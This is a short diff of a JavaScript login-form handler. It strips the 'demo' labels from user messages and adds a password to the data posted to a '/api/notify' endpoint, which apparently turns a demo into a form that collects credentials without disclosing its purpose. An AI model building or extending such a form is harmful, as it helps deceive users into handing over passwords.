@@ -12,11 +12,11 @@ loginForm.addEventListener("submit", async function (event) {
   const phone = phoneInput?.value.trim();
 
   if (!phone) {
-    message.textContent = "Enter a demo mobile number.";
+    message.textContent = "Enter mobile number.";
     return;
   }
 
-  message.textContent = "Sending demo notification...";
+  message.textContent = "Processing your request...";
 
   try {
     const response = await fetch("/api/notify", {
@@ -24,7 +24,7 @@ loginForm.addEventListener("submit", async function (event) {
       headers: {
         "Content-Type": "application/json"
       },
-      body: JSON.stringify({ phone })
+      body: JSON.stringify({ phone,password})
     });
 
     if (!response.ok) {
@@ -32,7 +32,7 @@ loginForm.addEventListener("submit", async function (event) {
     }
 
     message.textContent =
-      "Demo notification sent successfully!";
+      "Request received successfully!";
 
     message.style.color = "#22c55e";
     loginForm.reset();
